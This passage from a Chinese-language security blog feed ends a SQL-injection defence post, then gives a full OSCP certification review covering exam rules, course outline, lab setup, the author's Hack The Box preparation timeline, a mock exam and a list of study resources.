&lt;p&gt;&lt;strong&gt;解決方案（三） : 資料庫套件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;其實這個解決方案是前兩個安案的延伸，有一些套件已經幫你做完上述兩件事情，所以透過套件來呼叫資料庫可防止攻擊發生，常見的像是 JAVA 的 JDBC 套件，其他程式語言也有類似的套件，但使用前務必做好功課，避免用了不安全的套件導致網站還是受到攻擊。&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;前面為快速說明原理挑了一些簡單易懂的攻擊來示範，實際上還有更多進階的攻擊手法，如果閱覽數量夠多，之後會再加開一篇分享一些更進階的用法與經典案例，有任何資安方面相關的問題都歡迎留言討論，或者直接到 Cymetrics 尋求協助。&lt;/p&gt;

		</content>
	</entry>
	
	<entry>
		<title>我們與 OSCP 的距離</title>
		<link href="https://tech-blog.cymetrics.io/posts/crystal/oscp-review/"/>
		<updated>2021-09-02T00:00:00-00:00</updated>
		<id>https://tech-blog.cymetrics.io/posts/crystal/oscp-review/</id>
		<content type="html">
		  &lt;!-- summary --&gt; 
&lt;!-- 八月的某一個凌晨，終於完成報告然後跟考官道別結束考試，半年的奮戰也告一段落。期待已久的 OSCP 到手啦！半年前 OSCP 對我而言也是 castle in the cloud，今天來分享這張證照是什麼，以及我自己的準備過程與心得。 --&gt;
&lt;!-- summary --&gt;
&lt;p&gt;資安領域中，多數人都聽過一張標榜最有公信力的證照，就是不少公司跟求職者趨之若鶩的 OSCP。&lt;br&gt;
常聽很多人說，OSCP 證照是『小魔王』，考前像在地獄爬一圈，考完前途一片光明，多少人考了四五次都沒過，簡直不要太殘忍。這張證照到底是何方神聖能被形容成這樣呢？&lt;/p&gt;
&lt;h2 id=&quot;%E9%97%9C%E6%96%BC-oscp&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E9%97%9C%E6%96%BC-oscp&quot;&gt;#&lt;/a&gt; 關於 OSCP&lt;/h2&gt;
&lt;p&gt;OSCP （Offensive Security Certified Professional）是 Offensive Security 這家公司發行的一系列證照之一，也是他的入門款第一張（對你沒聽錯，這個大魔王其實是難度比較低的基礎款喔）。Offensive Security 每隔一陣子就會更新課程內容跟證照類型，所以有一些證照現在已經不能考或是改名了，現階段發行的證照可以去官網查詢：&lt;br&gt;
&lt;figure&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/crystal/oscp/oscp-certs.png&quot;&gt;&lt;figcaption&gt;&lt;p&gt;OSCP 證照們&lt;/p&gt;
&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;從下面這個編號命名規則跟學習流程圖也可以看出 OSCP 的編號 PEN-200 是最基礎也最 general 的。後續有更深入的 OSEP(PEN-300) 以及專精網頁攻擊的 OSWP(WEB-300) 跟專攻 exploit 開發的 OSED(EXP-301) OSEE(EXP-401) 等等。&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/crystal/oscp/certs-journey.png&quot;&gt;&lt;figcaption&gt;&lt;p&gt;PWK journey&lt;/p&gt;
&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;忘了之前是在哪個網站看到的，有一張截止今年二月各種資安證照的示意圖，感覺應該是依照難度跟領域劃分的，放這裡僅供想考證照的人參考。可以看到 OSCP 在最右邊中上的地方：&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/crystal/oscp/certs-all.png&quot;&gt;&lt;figcaption&gt;&lt;p&gt;各種資安證照&lt;/p&gt;
&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;回到 OSCP，這張證照的考試內容算是比較廣泛的，就是模擬你進到內網裡面有一堆機器，你要如何快速找出一些淺顯的弱點（例如版本過舊的軟體、看起來很可疑的網站、權限沒鎖好的服務等等）並收集資訊，然後利用這些弱點進到機器獲得低權限，再試圖提權拿到最高權限。&lt;/p&gt;
&lt;p&gt;説 OSCP 是入門的原因也是因為，課程中大多數設計好的『漏洞』通常都是有公開 exploit （可能需要一點手動修改）或是一些需要手動執行但是概念簡單的問題（例如 SQL injection），但並不會需要你自己從頭挖掘或撰寫一份 exploit（當然你要把手動執行的部分自動化也是不錯的練習），簡言之，一切都是『已知的』，只是你有沒有觀察到而已。我的感想是，這個考試只是過濾掉一些 script kiddie 並訓練你基本技巧的熟練度跟分辨 rabbit hole，不會讓你變成漏洞挖掘大師 XDD&lt;/p&gt;
&lt;h3 id=&quot;%E8%80%83%E8%A9%A6%E6%96%B9%E5%BC%8F&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E8%80%83%E8%A9%A6%E6%96%B9%E5%BC%8F&quot;&gt;#&lt;/a&gt; 考試方式&lt;/h3&gt;
&lt;p&gt;OSCP 不是一般筆試，而是給你 24 小時打下 5 台機器的上機考，然後還會有 24 小時可以寫一份完整的滲透測試報告，所以總計是一個 24+24 小時的考試。因為現在是上機部分全程監考，所以你要在預定考試的前 15 分鐘先進去一個 portal 跟考官核對身份、確認環境（要拿起電腦讓他看到整個房間跟桌子下）、開螢幕分享跟攝影機，這時間如果因為設備或是其他問題 delay 就是吃到你自己的考試時間，所以建議考前自己測試一下。開始考試後考官全程會盯著你跟你的螢幕們看，要暫停或是中離都要跟他說一聲，回來也要。不用擔心，他們會輪班監考，不會陪你通宵。&lt;/p&gt;
&lt;p&gt;考 24 小時聽起來很可怕，不過考試的設計也不是要你 24 小時都在電腦前面敲敲打打，他是有考慮到睡覺吃飯休息運動等日常生活的，之前在 reddit 上看到有人說，考試設計是你應該在 12 小時內就可以完成的，所以不用到廢寢忘食啦！（雖然會想考這張的應該打 CTF 也常常不小心玩到通霄 XDD）&lt;/p&gt;
&lt;p&gt;如果你有到寫報告的階段，會再有 24 小時可以寫一份專業的滲透測試報告，寫完壓縮上傳到一個網站，送出就不能再修改，格式內容檔名都不行。這部分官方有提供一個模板，社群也有很多改良版本，讓你可以把考試機器的過程填格子填好，前後罐頭文字都不用動，就算是沒寫過報告的也可以滿簡單的完成。要別注意的是，前面上機考的時間一結束你就再也進不去了考試環境了，所以缺截圖少步驟也沒辦法補上，請培養隨時截圖並做筆記記錄步驟跟結果的習慣。我自己是一邊打一邊寫，打完一台就把整個過程完整寫進報告裡，所以上機考完差不多就可以交報告了。&lt;/p&gt;
&lt;p&gt;每台機器都有配分，分別是 25 25 20 20 10，總共滿分 100 分，這個配分指的是你可以從這台機器拿到的最高分數，也就是說一台 25 分的機器你要拿到最高權限的 flag 並且報告都沒被扣分才能拿到 25 分，如果你只拿到低權限的 flag 或是報告沒寫好，就只有部分分數甚至沒分（報告是看得很重的）。最後必須至少 70 分才會通過考試，所以上機可以的話多拿一點分數比較保險，如果連 70 分都沒有也就可以不用寫報告了。另外，聽說 lab 跟課程的 exercise 如果有做完然後寫完整的 writeup 有機會加五分，不過我覺得 CP 值頗低所以沒做。&lt;/p&gt;
&lt;h3 id=&quot;%E8%AA%B2%E7%A8%8B%E8%88%87%E8%A8%AD%E5%82%99&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E8%AA%B2%E7%A8%8B%E8%88%87%E8%A8%AD%E5%82%99&quot;&gt;#&lt;/a&gt; 課程與設備&lt;/h3&gt;
&lt;p&gt;OSCP 的考試是跟課程綁在一起的，也就是你報名的是 PEN-200 這個課程然後會附帶考試機會一次，後續要是沒考過可以再買補考，不過第一次是不能只買考試的。（現在官網還有買 365 天加考試機會兩次的方案，真的會有人買嗎）&lt;/p&gt;
&lt;p&gt;那課程內容有哪些呢？當你報名之後會收到教材包，裡面有壓縮後 4GB 的影片們與 851 頁的 PDF 講義，影片跟講義的章節跟內容都是對應的，可以想像成是動畫有聲書（？）然後還有登入 VPN 跟論壇的一組帳號密碼。&lt;/p&gt;
&lt;p&gt;首先，開始前你需要準備幾樣東西。&lt;/p&gt;
&lt;p&gt;第一是一台 kali，教材包裡面官方會寄給你一台舊一點的版本，不過我是用我自己的 kali，雖然有聽過別人討論不同版本有些工具會出問題（kali 是 rolling release 會一直更新），不過我自己是沒遇到什麼 google 無法解決的問題啦，考試也很順利。&lt;/p&gt;
&lt;p&gt;第二是做筆記的軟體。我用的是 kali 內建的 cherrytree，不過我覺得用自己熟悉的就行。讀講義跟練 lab 的時候，要有條理地整理自己嘗試的方法、步驟、指令、甚至截圖，不管是不是要寫 writeup，留個紀錄都好。說不定考試的時候剛好遇到一個似曾相識的狀況，這時候有筆記跟步驟就會讓你安心許多，而且平時就培養做好筆記的習慣，考試也不容易東漏西漏最後還要回去一直補洞。&lt;/p&gt;
&lt;p&gt;考試的話，排好時辰之後你會收到一封信告訴你需要準備哪些東西跟一個 FAQ 網址。設備不外乎就是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;鏡頭：我用 mac 的內嵌鏡頭但也可以外接，畫質要讓考官可以清楚看見你的身份證明文件&lt;/li&gt;
&lt;li&gt;還算通順的網路：官方給你的 VPN 包會附說明跟你說 ping time 多少比較好，我平常在家練 lab 大概是下載上傳 16Mbps/3Mbps，除了 RDP 跟 tunneling 之後有一點卡之外大致上都還行，不過考試的時候除了 VPN 還要分享鏡頭跟螢幕，全程視訊真的是會 lag，所以我是到學校用超高速網路 XDD 我覺得保守一點一般 100Mbps/60Mbps 應該就很順暢了。&lt;/li&gt;
&lt;li&gt;身份證明文件：政府發行的證件，但必須是英文的，所以台灣人應該只能用護照了吧（？）注意這個要跟你註冊的名字一樣！！&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;%E8%AA%B2%E7%A8%8B%E5%85%A7%E5%AE%B9&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E8%AA%B2%E7%A8%8B%E5%85%A7%E5%AE%B9&quot;&gt;#&lt;/a&gt; 課程內容&lt;/h3&gt;
&lt;p&gt;講義的部分內容依據章節順序大概是：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;介紹 PWK(PEN-200)：包含課程、環境、報告、考試規範等等&lt;/li&gt;
&lt;li&gt;基礎
&lt;ol&gt;
&lt;li&gt;Kali 教學：怎麼安裝跟使用 kali linux，還有 command line 教學&lt;/li&gt;
&lt;li&gt;工具介紹：netcat, powershell, wireshark 等等常用工具&lt;/li&gt;
&lt;li&gt;寫簡單的 bash script&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;資料收集：
&lt;ol&gt;
&lt;li&gt;Passive recon: google hacking, email password dump...&lt;/li&gt;
&lt;li&gt;Active recon （各種服務的資訊收集）
&lt;ol&gt;
&lt;li&gt;port scanning&lt;/li&gt;
&lt;li&gt;DNS, SMB, NFS, SMTP, SNMP 等等的枚舉技巧&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;Vulnerability scanning&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;網頁攻擊：
&lt;ol&gt;
&lt;li&gt;手動勘查、工具使用&lt;/li&gt;
&lt;li&gt;XSS, Directory traversal, File inclusion, SQL injection...&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;Buffer Overflow (Windows + Linux)：最簡單的那種，連 NX 都沒開，return address + shellcode 結束這一回合&lt;/li&gt;
&lt;li&gt;Client-Side Attacks: HTA, Microsoft Word...（惡意軟體實作入門 XDD）&lt;/li&gt;
&lt;li&gt;尋找、修改、編譯、使用 public exploit&lt;/li&gt;
&lt;li&gt;file transfer 的技巧&lt;/li&gt;
&lt;li&gt;避開防毒軟體&lt;/li&gt;
&lt;li&gt;提權（Privilege Escalation）&lt;/li&gt;
&lt;li&gt;爆密碼&lt;/li&gt;
&lt;li&gt;port forwarding 跟 tunneling 的小技巧&lt;/li&gt;
&lt;li&gt;Active Directory (AD)&lt;/li&gt;
&lt;li&gt;Metasploit 跟 Powershell Empire 教學&lt;/li&gt;
&lt;li&gt;完整滲透測試的一次 walkthrough&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;基本上，如果不是完全沒有一點資訊背景，我覺得可以跳過第二段基礎的部分。然後如果是純粹為了短時間內通過考試，可以先跳過 passive recon、client-side attack、防毒、port forwarding、AD、Metasploit（禁用）這些章節，扣掉零零總總大概剩 3/5 的內容。雖然扣除的部分都還蠻有趣而且現實中也實用，不過因為考試中不會/不能出現，所以趕時間的朋友可以重點練下面幾個技巧：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Active recon&lt;/li&gt;
&lt;li&gt;網頁攻擊&lt;/li&gt;
&lt;li&gt;public exploit&lt;/li&gt;
&lt;li&gt;file transfer&lt;/li&gt;
&lt;li&gt;提權（Privilege Escalation）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我自己因為在報名 OSCP 之前玩了好一陣子的 Hack The Box (HTB)，所以對課程主題都有一點熟悉度了，講義影片這邊只花了兩三天快速看過加補足一些沒看過的技巧。依據 reddit 上的討論，如果是完全沒接觸過的話，建議把講義從頭讀一遍（或是看完影片）並整理自己的筆記，exercise 也可以選著做一些；有點基礎的話，還是可以搭配講義跳著看來補充整理一下屬於自己的筆記，雖然內容可能很冗長，但是官方課程內容的優點就是真的講得很仔細，雖然不深但算是很全面的介紹，當作是複習一下也不錯，偶而還是會戳到一些沒那麼清楚或是不懂的點。講義的每個小章節都會有一些 exercise 讓你動手練習（lab 裡面會有你專屬的 client machine 可以用），這部分如果有全部做完然後寫 writeup 就可以額外加分，不過我也沒從頭讀完，所以就沒做這塊。&lt;/p&gt;
&lt;p&gt;我自己覺得最重要最有幫助的其實是最後一章帶你做一次滲透測試的部分（在 lab 裡面也可以跟著做一次）。這段會給你一台入口機器，然後教你如何枚舉如何選擇 attack vector 層層推進，會深入好幾層內網最後拿下 AD，基本上講義內所有類型的技巧都會用到。&lt;/p&gt;
&lt;p&gt;雖然個別的技巧都會用，但是我一直覺得自己缺少一個明確的方法論跟做滲透的 SOP 來最有效率的串出攻擊鍊，一看到機會就見獵心喜的衝進去，試了半天才發現死路一條。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;我覺得這門課另一個很重要的目的是建立一套穩定的中心思想，讓你在真的滲透的時候能有計畫跟邏輯的進行攻擊，而不是亂槍打鳥。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;附帶一提，lab 裡面有兩台機器有官方的 writeup，也是非常重要的資源，建議一定看過想過一遍，會省很多走歪路的時間。再提一點，既然這門課希望建立你的方法論，考試機器就勢必會開很多誘餌服務來誤導你，做好時間控管並且學會判斷哪些才是真的 meaty 很關鍵。&lt;/p&gt;
&lt;h3 id=&quot;lab&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#lab&quot;&gt;#&lt;/a&gt; Lab&lt;/h3&gt;
&lt;p&gt;Lab 環境就是模擬一整個企業的網路，大概長得像下面這張圖，外層是你用 VPN 連過去就可以直接 access 的 public network，還有必需透過 tunneling 才可以連到的內部網路 IT DEV ADMIN 部門。這個網路是跟其他學生共用的，所以每一台打之前建議先 reset ，不然有時候被別人弄壞了或是改了設定就會白費時間，或是偶爾解一解看到其他人留下來的痕跡然後被暴雷 XDD&lt;/p&gt;
&lt;p&gt;下面的 private segment 是每個人會有三台專屬的機器，分別是一台 linux 一台 win10 跟一台 windows server，主要是在講義 exercise 的時候讓你實作練習用的。這三台機器要自己 reset 才會 spin 起來，並在 VPN 斷掉後也會關掉。我自己是只有用到 win10 來做 windows 的 BOF，因為考試的時候一定會有一題 25 分的 BOF，然後官方也會給你一台 debugging machine，所以還是考前練習一下怎麼用那個軟體比較保險 XDDD&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/crystal/oscp/lab-env.png&quot;&gt;&lt;figcaption&gt;&lt;p&gt;Lab 環境&lt;/p&gt;
&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;截至 2021/08/19 （我的最後一天）為止，不算講義中帶你做的模擬測試的話，總共有 70 台機器，據官方所說其中還有約 5~8 台前考試機。&lt;/p&gt;
&lt;p&gt;你的 VPN 帳號密碼也會用來登入一個學生專用的論壇，裡面有分門別類的討論區，大致上劃分成機器區、教材區、其他問題區。你可以在裡面跟其他同學還有校友交流，不過如果對題目暴雷太多會被管理員刪除字句，所以很多提示都會講得很隱晦。除了考試機器，任何相關問題都能問，不管是技術相關或是關於考試需要的硬體設備等疑難雜症幾乎都會有人回應。&lt;/p&gt;
&lt;h2 id=&quot;%E6%80%8E%E9%BA%BC%E6%BA%96%E5%82%99&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%80%8E%E9%BA%BC%E6%BA%96%E5%82%99&quot;&gt;#&lt;/a&gt; 怎麼準備&lt;/h2&gt;
&lt;p&gt;大家最想知道的當然是：我到底該怎麼準備？先讓我講講自己的經驗再介紹一些資源給大家。&lt;/p&gt;
&lt;p&gt;我決定要考 OSCP 的時候被各種評論嚇得不輕，所以規劃了半年來準備，整體來說從二月努力到八月底考試。二月開始，我大概每週花 16 小時練 Hack The Box (HTB) 上面的題目，然後因為想要做完 lab 直接考，所以我在六月底左右報名 60 天的 lab，最後八月底考完畢業。&lt;/p&gt;
&lt;h3 id=&quot;2~6%E6%9C%88-htb&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#2~6%E6%9C%88-htb&quot;&gt;#&lt;/a&gt; 2~6月 HTB&lt;/h3&gt;
&lt;p&gt;HTB 是一個很酷的練習平台，上面除了有非常大量的 machines 之外還有 CTF jeopardy style 的題目、專攻某些技術的 tracks、一系列 AD 機器的 fortress 等等，總之有非常多資源可以讓你打到爽。&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/crystal/oscp/htb.png&quot;&gt;&lt;figcaption&gt;&lt;p&gt;Hack The Box&lt;/p&gt;
&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;跟 OSCP 最像的 machine（或是 box）也有各種 OS 跟難易度（雖然時間越近的難易度已經大幅躍升了），免費用戶可以玩一小批會 rotate 的 box，付費的話就可以玩所有的 retired machine，總共好幾百台。每週都會推出新的 box 可以玩，而且都會有官方論壇可以交流討論給提示，是個很有幫助的社群 XDDD&lt;/p&gt;
&lt;p&gt;而且最重要的是，初學者可以用這些 box 搭配別人的 writeup 還有 walkthrough 學到很多技巧跟經驗，例如廣為推崇的 &lt;a href=&quot;https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA&quot;&gt;ippsec 影片&lt;/a&gt; 還有我自己常看的 &lt;a href=&quot;https://0xdf.gitlab.io/&quot;&gt;0xdf hacks stuff&lt;/a&gt;，因為他們不是只告訴你對的路在哪，而是會解釋自己是怎麼想的、走了哪些歪路、為什麼有些方法行不通等等，我覺得對建立自己的思路很有幫助。&lt;/p&gt;
&lt;p&gt;對於該如何學習這件事，相信每個人都有自己適合的方法，我的話是盡量嘗試但沒想法了就去論壇找 hints 或是找 writeup，理由很簡單，雖然自己撞也許過一陣子撞得出解法，但對初學者來說這樣效率低而且思考沒有系統化。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;這個方法並不是一卡住就找解答，這樣是不會成長的，而是把自己的招式跟能想到的方向都嘗試過後，就該是拜師求學的時候了，畢竟 you can&#39;t know what you don&#39;t know，人都是從模仿開始的。這時就可以參考我上面提過的網站，看看別人是怎麼想怎麼觀察的然後修正自己的方法，最後自己練習做一遍，把技巧變成自己的知識。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;為了準備考試而練習 HTB 的話，建議買 VIP 會員，一個月才 10 英鎊而已可以打幾百台機器真的很划算，補考一次都要 $249 了。練習順序的話可以參考 &lt;a href=&quot;https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159&quot;&gt;TJnull&#39;s list&lt;/a&gt;，裡面整理了跟 OSCP 比較像的 box，而且一直有在更新，可以幫你規劃練習。&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/crystal/oscp/tjnull.png&quot;&gt;&lt;figcaption&gt;&lt;p&gt;TJnull&#39;s list&lt;/p&gt;
&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;不過也許是因為 OSCP 的 box 比較不需要太多創意（？）所以在 HTB 上評分都不高，我自己是除了清單上的也把 easy 跟 medium 評價有 4 以上的都做了一遍，順序是由舊到新、由簡單到困難。&lt;/p&gt;
&lt;p&gt;我在這個時期累積了很多技巧跟經驗，甚至有點過度轟炸的狀態，因為每個 box 用到的技巧都不同也不太會重複，所以就是不斷的『哇哇哇原來可以這樣啊』，比較少有『嗯嗯一看就是這樣啦』的感覺。後期慢慢就培養出自己的直覺了，可以比較快速地知道哪裡有問題以及該如何找到方法，做的筆記也在考試準備上很有幫助。&lt;/p&gt;
&lt;p&gt;附帶一提，跟 HTB 相似的 Proving Grounds (PG) 聽說也不錯，雖然機器沒有 HTB 多但是因為後來被 Offensive Security 買下來了所以據說裡面的 box 是最接近 OSCP 考試的，上面的 TJnull&#39;s list 也有整理進去。&lt;/p&gt;
&lt;h3 id=&quot;7~8%E6%9C%88-oscp-lab&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#7~8%E6%9C%88-oscp-lab&quot;&gt;#&lt;/a&gt; 7~8月 OSCP Lab&lt;/h3&gt;
&lt;p&gt;差不多把 HTB 上的 easy + medium 的 linux + windows box 練了八成之後，就覺得好像有點基礎可以來試試 OSCP lab 了。&lt;/p&gt;
&lt;p&gt;講義的部分沒有花太多時間，因為 HTB 教的技巧更多更深，不過漏網之魚還是花了一兩天補起來，方法論的部分也認真思考了一遍。&lt;/p&gt;
&lt;p&gt;剛開始練 lab 的時候有點迷惘，因為不管是 CTF 還是 HTB、PG 這種練習平台，都是一個 IP 一個 IP 各自獨立的所以標的很明確，但 lab 就是一整個大網路，裡面有一堆機器，你怎麼知道從哪邊開始好？有些機器還有相依性，不解完一台進不去另一台，又該如何判斷？&lt;/p&gt;
&lt;p&gt;這時候就是用到 OSCP 方法論的時候了！&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;你必須透過大範圍的掃描跟 DNS 的資訊判別有哪些機器以及他們各自的特性，由粗而細檢視這個網路、挑選攻擊對象，最後逐一擊破。拿到最高權限還不夠，你必須好好搜刮裡面的資訊，才能更好的狙擊下一個目標。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;雖然你也可以偷看繳交 flag 的頁面來知道有哪些 IP 然後照順序打完，但我相信除去了建立全局觀並規劃攻擊順序的練習，你的收穫一定會少得多。&lt;/p&gt;
&lt;p&gt;這也是大家對於 OSCP lab 評價兩極的原因。課程中希望模擬真實世界的網路，大量用戶彼此間有互動跟資訊交流也有權限上的不同，有些機器戒備森嚴有些卻容易得莫名其妙，以『培養出有基礎能力的滲透測試人員』來說這點做得不錯。但是考試卻完全不同，是五台各自獨立的機器，目標是『在時間內打下這五個目標』。所以以學習的角度而言 OSCP lab 相當特別，但單純只是為了考到證照的話，其他的練習平台反而更符合需求。&lt;/p&gt;
&lt;p&gt;這方面我自己的心得是，如果時間足夠不妨同時進行。&lt;/p&gt;
&lt;p&gt;做 OSCP lab 做多了會陷入一個僵化的思維，就是掃服務，每個戳戳看，找到 exploit 或入口，打，跑提權的腳本，打，結束。exploit 的方式跟地方還有提權的技巧不外乎就那幾個。雖然 HTB 流程上也是差不多，但是每個階段都需要仔細觀察，變化跟技巧豐富度差很多，有可能你會找到某個權限或是位置稍微不同的執行檔，decompile 後會找到某個可以蓋過去的函式庫；有可能你要多開幾個連線，重複登入看看背後執行的程式有什麼不同。總之不會是找 exploit，打，拿 shell 這麼固定的方式。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;我覺得不管是我的經歷（先從 HTB 大量快速累積技巧，再用 OSCP 鞏固做滲透的方法論），或是先用 OSCP 建立基礎再用 HTB 訓練 thinking outside the box 並充實自己的工具箱，都是不錯的方式。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;8%E6%9C%88%E5%BA%95-oscp-pre-exam&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#8%E6%9C%88%E5%BA%95-oscp-pre-exam&quot;&gt;#&lt;/a&gt; 8月底 OSCP Pre-exam&lt;/h3&gt;
&lt;p&gt;讀書的時候，都有考過模擬考吧？考 OSCP 前，訓練時間管理跟壓力控管的一個方式，就是給自己一次完整的模擬考！&lt;/p&gt;
&lt;p&gt;在考前一兩週可以安排一次 24 小時的考試，模擬實際考試的環境跟時間，要求自己做完五台機器。我自己用的是 &lt;a href=&quot;https://johnjhacking.com/blog/the-oscp-preperation-guide-2020/&quot;&gt;John J Hacking - The OSCP Preparation Guide 2020&lt;/a&gt; 裡面建議的：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Buffer Overflow Machine: VulnHub Brainpan (25 Points)&lt;/li&gt;
&lt;li&gt;Jeeves (25 Points)&lt;/li&gt;
&lt;li&gt;Chatterbox (20 Points)&lt;/li&gt;
&lt;li&gt;Cronos (20 Points)&lt;/li&gt;
&lt;li&gt;Sense (10 Points)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;另外 TJnull 也有推薦在 VulnHub 上的另一組機器：&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/crystal/oscp/dry-run.png&quot;&gt;&lt;figcaption&gt;&lt;p&gt;Dry run&lt;/p&gt;
&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;請完全模擬考試，做完整的筆記跟截圖紀錄，不要使用手機也絕對不能去找提示，可以的話連報告也寫一份。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;就算沒有 70 分也沒關係，模擬考的目的是讓你知道自己準備的程度跟缺少的練習，順利完成是增進考試信心，沒完成也只是教會你更多考試能用的武器。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;%E8%B3%87%E6%BA%90&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E8%B3%87%E6%BA%90&quot;&gt;#&lt;/a&gt; 資源&lt;/h3&gt;
&lt;p&gt;這裡整理一些我覺得有幫助的資源、部落格、或是文章：&lt;/p&gt;
&lt;p&gt;Boxes:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.hackthebox.eu/&quot;&gt;Hack The Box&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.offensive-security.com/labs/&quot;&gt;Proving Grounds&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.vulnhub.com/&quot;&gt;VulnHub&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159&quot;&gt;TJnull&#39;s list&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA&quot;&gt;ippsec 影片&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://0xdf.gitlab.io/&quot;&gt;0xdf hacks stuff&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;更多 OSCP Prep：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://johnjhacking.com/blog/the-oscp-preperation-guide-2020/&quot;&gt;John J Hacking - The OSCP Preparation Guide 2020&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/&quot;&gt;Rana Khalil&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;好用的：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://book.hacktricks.xyz/&quot;&gt;HackTricks&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings&quot;&gt;Payloads All the Things&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://sushant747.gitbooks.io/total-oscp-guide/content/&quot;&gt;Sushant747 Total OSCP Guide&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.revshells.com/&quot;&gt;revshells&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://gtfobins.github.io/&quot;&gt;GTFOBins&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;%E5%85%B6%E4%BB%96%E5%BB%BA%E8%AD%B0&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%85%B6%E4%BB%96%E5%BB%BA%E8%AD%B0&quot;&gt;#&lt;/a&gt; 其他建議&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;提前一個月預約考試。剩兩三週的時候比較好的時間大概都沒了，如果你不想要晚上八點到早上六點之間開始的話要早點預約，反正時間可以改三次而且早點約比較有死線的感覺（？）&lt;/li&gt;
&lt;li&gt;睡好，吃飽，常常起來走動休息。真的，你需要新鮮的腦袋來釐清思路，答案就在那裡，只是頂著一個又累又緊繃的漿糊腦是看不出來的。你不需要 24 小時，你只需要思緒清楚的 12 小時。附上一句別人心得裡面我很喜歡的一句話：&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
